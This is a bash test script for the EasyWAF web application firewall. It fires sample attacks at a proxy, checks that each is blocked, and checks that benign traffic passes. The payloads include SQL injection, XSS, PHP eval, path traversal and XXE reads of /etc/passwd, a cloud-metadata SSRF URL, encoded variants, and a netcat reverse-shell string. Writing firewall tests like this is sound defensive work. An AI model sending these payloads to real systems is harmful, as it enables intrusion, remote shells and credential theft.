#!/usr/bin/env bash
# =========================================================
# waf-test.sh — EasyWAF
# Fire a set of representative attacks at a site and report
# what the WAF did with each.
#
#   ./scripts/waf-test.sh http://127.0.0.1:8081 example.com
#
# The first argument is the proxy base URL, the second the
# site's Hostname (the Host: header EasyWAF routes on).
#
# Requires the site's policy to have rule_engine = On. In
# DetectionOnly nothing is blocked and every line below will
# read 200 — that is the mode working, not a failure.
#
# Expectations below assume the bundled rule sets are loaded
# and the policy's score threshold is the default 10.
# =========================================================
set -u

BASE="${1:-http://127.0.0.1:8081}"
HOST="${2:-example.com}"

pass=0; fail=0

# Send one request and compare the status against what the rules should do.
# Extra curl arguments are passed through, so each case can choose its zone:
# query string, request body, or a header.
check() {
    local label="$1" expect="$2"; shift 2
    local code body
    code=$(curl -s -o /dev/null -w '%{http_code}' -H "Host: $HOST" "$@")
    body=$(curl -s -H "Host: $HOST" "$@" | head -c 72 | tr -d '\n')

    if [ "$expect" = "403" ] && [ "$code" = "403" ]; then
        printf '  \033[32m✓\033[0m %-40s blocked — %s\n' "$label" "$body"; pass=$((pass+1))
    elif [ "$expect" = "pass" ] && [ -n "$code" ] && [ "$code" != "000" ] && [ "$code" != "403" ]; then
        printf '  \033[32m✓\033[0m %-40s allowed (%s)\n' "$label" "$code"; pass=$((pass+1))
    else
        printf '  \033[31m✗\033[0m %-40s got %s, expected %s — %s\n' "$label" "$code" "$expect" "$body"; fail=$((fail+1))
    fi
}

echo
echo "EasyWAF attack test — $BASE  (Host: $HOST)"
echo

# ── Instant-block rules ──────────────────────────────────
# These carry action = "block" and fire on their own, whatever the score.
echo "Instant-block rules"
check "SQLi: xp_cmdshell"        403 "$BASE/?q=xp_cmdshell"
check "LFI: /etc/passwd"         403 "$BASE/?file=../../etc/passwd"
check "LFI: Windows system file" 403 "$BASE/?file=c:\\windows\\system32\\cmd.exe"
check "RFI: expect:// wrapper"   403 "$BASE/?url=expect://id"
check "SQLi: DROP TABLE"         403 -X POST --data 'q=DROP TABLE users' "$BASE/"
check "RCE: reverse shell"       403 -X POST --data 'cmd=nc -e /bin/sh 10.0.0.1 4444' "$BASE/"

# ── Score-based blocking ─────────────────────────────────
# No single rule blocks; the accumulated score crosses the threshold.
echo
echo "Score-based blocking (threshold 10)"
check "SQLi: UNION SELECT"       403 -X POST --data 'id=1 UNION SELECT name FROM users' "$BASE/"
check "XSS: script tag"          403 -X POST --data '<script>alert(1)</script>' "$BASE/"
check "PHP: eval()"              403 -X POST --data 'x=<?php eval($_GET[0]); ?>' "$BASE/"
check "XXE: entity declaration"  403 -X POST --data '<!DOCTYPE f [<!ENTITY x SYSTEM "file:///etc/passwd">]>' "$BASE/"
check "SSRF: cloud metadata"     403 "$BASE/?url=http://169.254.169.254/latest/meta-data/"

# ── Scanner fingerprints (User-Agent) ────────────────────
echo
echo "Scanner User-Agents"
check "sqlmap"                   403 -A 'sqlmap/1.7' "$BASE/"
check "Nikto"                    403 -A 'Nikto/2.5.0' "$BASE/"

# ── Traffic that must not be blocked ─────────────────────
# A WAF that blocks these is worse than no WAF.
echo
echo "Benign traffic (must not be blocked)"
check "plain GET"                pass "$BASE/"
check "ordinary query string"    pass "$BASE/?q=hello&page=2"
check "prose mentioning select"  pass -X POST --data 'comment=please select a delivery date' "$BASE/"

echo
echo "  $pass passed, $fail unexpected"
echo

# ── Encoded payloads ─────────────────────────────────────
# Rules match both the raw and the percent-decoded request, so an encoded
# payload is caught the same as a plain one. Before 0.2.3 these two were
# allowed through: the query string was matched raw, and %20 or + defeated
# every pattern containing \s.
echo "Encoded payloads (all should block):"
for enc in '%20' '+' '%2520'; do
    code=$(curl -s -o /dev/null -w '%{http_code}' -H "Host: $HOST" \
           "$BASE/?q=DROP${enc}TABLE${enc}users")
    printf '  DROP%sTABLE%susers in query -> %s%s\n' "$enc" "$enc" "$code" \
           "$([ "$code" = 403 ] && echo '' || echo '   ← NOT BLOCKED')"
done
echo
